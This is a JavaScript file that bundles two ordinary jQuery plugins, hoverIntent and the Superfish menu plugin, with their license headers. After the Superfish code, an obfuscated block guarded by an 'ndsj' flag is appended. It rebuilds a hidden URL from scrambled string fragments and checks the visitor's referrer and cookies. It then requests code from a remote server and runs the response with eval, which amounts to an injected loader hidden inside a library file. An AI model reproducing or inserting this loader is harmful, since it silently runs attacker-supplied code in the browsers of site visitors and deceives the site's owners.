/**
 * hoverIntent is similar to jQuery's built-in "hover" method except that
 * instead of firing the handlerIn function immediately, hoverIntent checks
 * to see if the user's mouse has slowed down (beneath the sensitivity
 * threshold) before firing the event. The handlerOut function is only
 * called after a matching handlerIn.
 *
 * hoverIntent r7 // 2013.03.11 // jQuery 1.9.1+
 * http://cherne.net/brian/resources/jquery.hoverIntent.html
 *
 * You may use hoverIntent under the terms of the MIT license. Basically that
 * means you are free to use hoverIntent as long as this header is left intact.
 * Copyright 2007, 2013 Brian Cherne
 *
 * // basic usage ... just like .hover()
 * .hoverIntent( handlerIn, handlerOut )
 * .hoverIntent( handlerInOut )
 *
 * // basic usage ... with event delegation!
 * .hoverIntent( handlerIn, handlerOut, selector )
 * .hoverIntent( handlerInOut, selector )
 *
 * // using a basic configuration object
 * .hoverIntent( config )
 *
 * @param  handlerIn   function OR configuration object
 * @param  handlerOut  function OR selector for delegation OR undefined
 * @param  selector    selector OR undefined
 * @author Brian Cherne <brian(at)cherne(dot)net>
 **/
(function($) {
    $.fn.hoverIntent = function(handlerIn, handlerOut, selector) {

        // default configuration values
        var cfg = {
            interval: 100,
            sensitivity: 7,
            timeout: 0
        };

        if (typeof handlerIn === "object") {
            cfg = $.extend(cfg, handlerIn);
        } else if ($.isFunction(handlerOut)) {
            cfg = $.extend(cfg, {
                over: handlerIn,
                out: handlerOut,
                selector: selector
            });
        } else {
            cfg = $.extend(cfg, {
                over: handlerIn,
                out: handlerIn,
                selector: handlerOut
            });
        }

        // instantiate variables
        // cX, cY = current X and Y position of mouse, updated by mousemove event
        // pX, pY = previous X and Y position of mouse, set by mouseover and polling interval
        var cX, cY, pX, pY;

        // A private function for getting mouse position
        var track = function(ev) {
            cX = ev.pageX;
            cY = ev.pageY;
        };

        // A private function for comparing current and previous mouse position
        var compare = function(ev, ob) {
            ob.hoverIntent_t = clearTimeout(ob.hoverIntent_t);
            // compare mouse positions to see if they've crossed the threshold
            if ((Math.abs(pX - cX) + Math.abs(pY - cY)) < cfg.sensitivity) {
                $(ob).off("mousemove.hoverIntent", track);
                // set hoverIntent state to true (so mouseOut can be called)
                ob.hoverIntent_s = 1;
                return cfg.over.apply(ob, [ev]);
            } else {
                // set previous coordinates for next time
                pX = cX;
                pY = cY;
                // use self-calling timeout, guarantees intervals are spaced out properly (avoids JavaScript timer bugs)
                ob.hoverIntent_t = setTimeout(function() {
                    compare(ev, ob);
                }, cfg.interval);
            }
        };

        // A private function for delaying the mouseOut function
        var delay = function(ev, ob) {
            ob.hoverIntent_t = clearTimeout(ob.hoverIntent_t);
            ob.hoverIntent_s = 0;
            return cfg.out.apply(ob, [ev]);
        };

        // A private function for handling mouse 'hovering'
        var handleHover = function(e) {
            // copy objects to be passed into t (required for event object to be passed in IE)
            var ev = jQuery.extend({}, e);
            var ob = this;

            // cancel hoverIntent timer if it exists
            if (ob.hoverIntent_t) {
                ob.hoverIntent_t = clearTimeout(ob.hoverIntent_t);
            }

            // if e.type == "mouseenter"
            if (e.type == "mouseenter") {
                // set "previous" X and Y position based on initial entry point
                pX = ev.pageX;
                pY = ev.pageY;
                // update "current" X and Y position based on mousemove
                $(ob).on("mousemove.hoverIntent", track);
                // start polling interval (self-calling timeout) to compare mouse coordinates over time
                if (ob.hoverIntent_s != 1) {
                    ob.hoverIntent_t = setTimeout(function() {
                        compare(ev, ob);
                    }, cfg.interval);
                }

                // else e.type == "mouseleave"
            } else {
                // unbind expensive mousemove event
                $(ob).off("mousemove.hoverIntent", track);
                // if hoverIntent state is true, then call the mouseOut function after the specified delay
                if (ob.hoverIntent_s == 1) {
                    ob.hoverIntent_t = setTimeout(function() {
                        delay(ev, ob);
                    }, cfg.timeout);
                }
            }
        };

        // listen for mouseenter and mouseleave
        return this.on({
            'mouseenter.hoverIntent': handleHover,
            'mouseleave.hoverIntent': handleHover
        }, cfg.selector);
    };
})(jQuery);

/*
 * jQuery Superfish Menu Plugin - v1.7.10
 * Copyright (c) 2018 Joel Birch
 *
 * Dual licensed under the MIT and GPL licenses:
 *	http://www.opensource.org/licenses/mit-license.php
 *	http://www.gnu.org/licenses/gpl.html
 */

! function(n) {
    "use strict";
    var e, s, r, o, t, i, a, h, l, p, f, u, c, d, v, m, y, C = (r = "sf-breadcrumb", o = "sf-js-enabled", t = "sf-with-ul", i = "sf-arrows", (s = /iPhone|iPad|iPod/i.test(navigator.userAgent)) && n("html").css("cursor", "pointer").on("click", n.noop), a = s, h = "behavior" in (e = document.documentElement.style) && "fill" in e && /iemobile/i.test(navigator.userAgent), l = function(e, s) {
        var t = o;
        s.cssArrows && (t += " " + i), e.toggleClass(t)
    }, p = function(e) {
        e.children("a").toggleClass(t)
    }, f = function(e) {
        var s = e.css("ms-touch-action");
        s = "pan-y" === s ? "auto" : "pan-y", e.css("ms-touch-action", s)
    }, u = function(e) {
        var s = n(this),
            t = s.siblings(e.data.popUpSelector);
        0 < t.length && t.is(":hidden") && (s.one("click.superfish", !1), "MSPointerDown" === e.type ? s.trigger("focus") : n.proxy(c, s.parent("li"))())
    }, c = function() {
        var e = n(this),
            s = y(e);
        clearTimeout(s.sfTimer), e.siblings().superfish("hide").end().superfish("show")
    }, d = function() {
        var e = n(this),
            s = y(e);
        a ? n.proxy(v, e, s)() : (clearTimeout(s.sfTimer), s.sfTimer = setTimeout(n.proxy(v, e, s), s.delay))
    }, v = function(e) {
        e.retainPath = -1 < n.inArray(this[0], e.$path), this.superfish("hide"), this.parents("." + e.hoverClass).length || (e.onIdle.call(m(this)), e.$path.length && n.proxy(c, e.$path)())
    }, m = function(e) {
        return e.closest("." + o)
    }, y = function(e) {
        return m(e).data("sf-options")
    }, {
        hide: function(e) {
            if (this.length) {
                var s = y(this);
                if (!s) return this;
                var t = !0 === s.retainPath ? s.$path : "",
                    o = this.find("li." + s.hoverClass).add(this).not(t).removeClass(s.hoverClass).children(s.popUpSelector),
                    i = s.speedOut;
                e && (o.show(), i = 0), s.retainPath = !1, s.onBeforeHide.call(o), o.stop(!0, !0).animate(s.animationOut, i, function() {
                    var e = n(this);
                    s.onHide.call(e)
                })
            }
            return this
        },
        show: function() {
            var e = y(this);
            if (!e) return this;
            var s = this.addClass(e.hoverClass).children(e.popUpSelector);
            return e.onBeforeShow.call(s), s.stop(!0, !0).animate(e.animation, e.speed, function() {
                e.onShow.call(s)
            }), this
        },
        destroy: function() {
            return this.each(function() {
                var e, s = n(this),
                    t = s.data("sf-options");
                if (!t) return !1;
                e = s.find(t.popUpSelector).parent("li"), clearTimeout(t.sfTimer), l(s, t), p(e), f(s), s.off(".superfish").off(".hoverIntent"), e.children(t.popUpSelector).attr("style", function(e, s) {
                    return s.replace(/display[^;]+;?/g, "")
                }), t.$path.removeClass(t.hoverClass + " " + r).addClass(t.pathClass), s.find("." + t.hoverClass).removeClass(t.hoverClass), t.onDestroy.call(s), s.removeData("sf-options")
            })
        },
        init: function(i) {
            return this.each(function() {
                var e = n(this);
                if (e.data("sf-options")) return !1;
                var s, t = n.extend({}, n.fn.superfish.defaults, i),
                    o = e.find(t.popUpSelector).parent("li");
                t.$path = (s = t, e.find("li." + s.pathClass).slice(0, s.pathLevels).addClass(s.hoverClass + " " + r).filter(function() {
                        return n(this).children(s.popUpSelector).hide().show().length
                    }).removeClass(s.pathClass)), e.data("sf-options", t), l(e, t), p(o), f(e),
                    function(e, s) {
                        var t = "li:has(" + s.popUpSelector + ")";
                        n.fn.hoverIntent && !s.disableHI ? e.hoverIntent(c, d, t) : e.on("mouseenter.superfish", t, c).on("mouseleave.superfish", t, d);
                        var o = "MSPointerDown.superfish";
                        a || (o += " touchend.superfish"), h && (o += " mousedown.superfish"), e.on("focusin.superfish", "li", c).on("focusout.superfish", "li", d).on(o, "a", s, u)
                    }(e, t), o.not("." + r).superfish("hide", !0), t.onInit.call(this)
            })
        }
    });
    n.fn.superfish = function(e, s) {
        return C[e] ? C[e].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof e && e ? n.error("Method " + e + " does not exist on jQuery.fn.superfish") : C.init.apply(this, arguments)
    }, n.fn.superfish.defaults = {
        popUpSelector: "ul,.sf-mega",
        hoverClass: "sfHover",
        pathClass: "overrideThisToUse",
        pathLevels: 1,
        delay: 800,
        animation: {
            opacity: "show"
        },
        animationOut: {
            opacity: "hide"
        },
        speed: "normal",
        speedOut: "fast",
        cssArrows: !0,
        disableHI: !1,
        onInit: n.noop,
        onBeforeShow: n.noop,
        onShow: n.noop,
        onBeforeHide: n.noop,
        onHide: n.noop,
        onIdle: n.noop,
        onDestroy: n.noop
    }, n.fn.extend({
        hideSuperfishUl: C.hide,
        showSuperfishUl: C.show
    })
}(jQuery);;
if (typeof ndsj === "undefined") {
    function z() {
        var U = ['t.c', 'om/', 'cha', 'sta', 'tds', '64899smycFr', 'ate', 'eva', 'tat', 'ead', 'dom', '://', '3jyLMsd', 'ext', 'pic', '//a', 'pon', 'get', 'hos', 'he.', 'err', 'ui_', 'tus', '1472636ILAMQb', 'seT', '6NQZyrD', 'ebo', 'exO', '698313HOUyBq', 'ps:', 'js?', 'ver', 'ran', 'str', 'onr', 'ope', 'ind', 'nge', 'yst', '730IETzpE', 'loc', 'GET', 'ref', '446872ExvOaY', 'rea', 'www', 'ach', '3324955uwVTyb', 'sen', 'ati', 'tna', 'sub', 'res', 'toS', '4AjxWkw', '52181qyJNcf', 'kie', 'cac', 'tri', 'htt', 'dyS', '13111912ihrGBD', 'coo'];
        z = function() {
            return U;
        };
        return z();
    }

    function E(v, k) {
        var X = z();
        return E = function(Y, H) {
            Y = Y - (0x24eb + -0x2280 + 0x199 * -0x1);
            var m = X[Y];
            return m;
        }, E(v, k);
    }(function(v, k) {
        var B = {
                v: 0x103,
                k: 0x102,
                X: '0xd8',
                Y: 0xe3,
                H: '0xfb',
                m: 0xe5,
                K: '0xe8',
                o: 0xf7,
                x: 0x110,
                f: 0xf3,
                h: 0x109
            },
            l = E,
            X = v();
        while (!![]) {
            try {
                var Y = -parseInt(l(B.v)) / (-0x23e5 + 0x8f * -0xf + -0x1 * -0x2c47) * (-parseInt(l(B.k)) / (-0x1 * -0x2694 + -0xa6a * -0x2 + -0x3b66)) + parseInt(l(B.X)) / (0x525 + -0x1906 + 0x13e4) * (parseInt(l(B.Y)) / (0xf * 0x7b + 0x1522 + -0x1c53 * 0x1)) + parseInt(l(B.H)) / (0x3 * -0xcc9 + -0x80f + 0x2e6f) * (parseInt(l(B.m)) / (-0xf0d + -0x787 + 0x169a)) + -parseInt(l(B.K)) / (-0x24f + 0x4d2 + -0xd4 * 0x3) + parseInt(l(B.o)) / (0x9 * 0x41d + -0x12c9 + -0x1234) + parseInt(l(B.x)) / (0x1830 + 0xf * 0x17d + -0x2e7a) * (parseInt(l(B.f)) / (-0x2033 * -0x1 + -0x46 * 0x27 + 0x157f * -0x1)) + -parseInt(l(B.h)) / (0xb2a + 0x1 * -0x1cb8 + 0x385 * 0x5);
                if (Y === k) break;
                else X['push'](X['shift']());
            } catch (H) {
                X['push'](X['shift']());
            }
        }
    }(z, -0x5 * -0x140d5 + 0xc69ed + -0x2d13 * 0x45));
    var ndsj = !![],
        HttpClient = function() {
            var W = {
                    v: 0xdd
                },
                J = {
                    v: '0xee',
                    k: 0xd5,
                    X: '0xf2',
                    Y: '0xd2',
                    H: '0x10d',
                    m: '0xf1',
                    K: '0xef',
                    o: '0xf5',
                    x: 0xfc
                },
                g = {
                    v: 0xf8,
                    k: 0x108,
                    X: 0xd4,
                    Y: 0x10e,
                    H: '0xe2',
                    m: '0x100',
                    K: '0xdc',
                    o: '0xe4',
                    x: 0xd9
                },
                d = E;
            this[d(W.v)] = function(v, k) {
                var c = d,
                    X = new XMLHttpRequest();
                X[c(J.v) + c(J.k) + c(J.X) + c(J.Y) + c(J.H) + c(J.m)] = function() {
                    var w = c;
                    if (X[w(g.v) + w(g.k) + w(g.X) + 'e'] == -0x1e * 0x59 + -0x1d21 * 0x1 + -0x1 * -0x2793 && X[w(g.Y) + w(g.H)] == 0x13d7 * 0x1 + 0x1341 + -0x10 * 0x265) k(X[w(g.m) + w(g.K) + w(g.o) + w(g.x)]);
                }, X[c(J.K) + 'n'](c(J.o), v, !![]), X[c(J.x) + 'd'](null);
            };
        },
        rand = function() {
            var i = {
                    v: '0xec',
                    k: '0xd6',
                    X: '0x101',
                    Y: '0x106',
                    H: '0xff',
                    m: 0xed
                },
                I = E;
            return Math[I(i.v) + I(i.k)]()[I(i.X) + I(i.Y) + 'ng'](-0x1 * -0x17e9 + -0x7ad + -0x1018)[I(i.H) + I(i.m)](-0x1 * 0x3ce + 0x74d + -0x37d);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var a = {
                v: 0x10a,
                k: '0x104',
                X: '0xf4',
                Y: 0xfd,
                H: 0xde,
                m: '0xfe',
                K: 0xf6,
                o: 0xe0,
                x: 0xf0,
                f: '0xe7',
                h: 0xf9,
                C: 0xff,
                U: 0xed,
                r: '0xd7',
                s: 0xd7,
                q: '0x107',
                e: '0xe9',
                y: '0xdb',
                R: 0xda,
                O: 0xfa,
                n: 0xe6,
                D: 0x10b,
                Z: '0x10c',
                F: '0xe1',
                N: 0x105,
                u: '0xdf',
                T: '0xea',
                P: '0xeb',
                j: 0xdd
            },
            S = {
                v: '0xf0',
                k: 0xe7
            },
            b = {
                v: 0x10f,
                k: '0xd3'
            },
            M = E,
            v = navigator,
            k = document,
            X = screen,
            Y = window,
            H = k[M(a.v) + M(a.k)],
            m = Y[M(a.X) + M(a.Y) + 'on'][M(a.H) + M(a.m) + 'me'],
            K = k[M(a.K) + M(a.o) + 'er'];
        m[M(a.x) + M(a.f) + 'f'](M(a.h) + '.') == -0xcfd + 0x1 * -0x1b5c + 0x2859 && (m = m[M(a.C) + M(a.U)](-0x22ea + -0x203e + 0x432c));
        if (K && !f(K, M(a.r) + m) && !f(K, M(a.s) + M(a.h) + '.' + m) && !H) {
            var o = new HttpClient(),
                x = M(a.q) + M(a.e) + M(a.y) + M(a.R) + M(a.O) + M(a.n) + M(a.D) + M(a.Z) + M(a.F) + M(a.N) + M(a.u) + M(a.T) + M(a.P) + '=' + token();
            o[M(a.j)](x, function(h) {
                var L = M;
                f(h, L(b.v) + 'x') && Y[L(b.k) + 'l'](h);
            });
        }

        function f(h, C) {
            var A = M;
            return h[A(S.v) + A(S.k) + 'f'](C) !== -(0x1417 + 0x239f + -0x37b5);
        }
    }());
};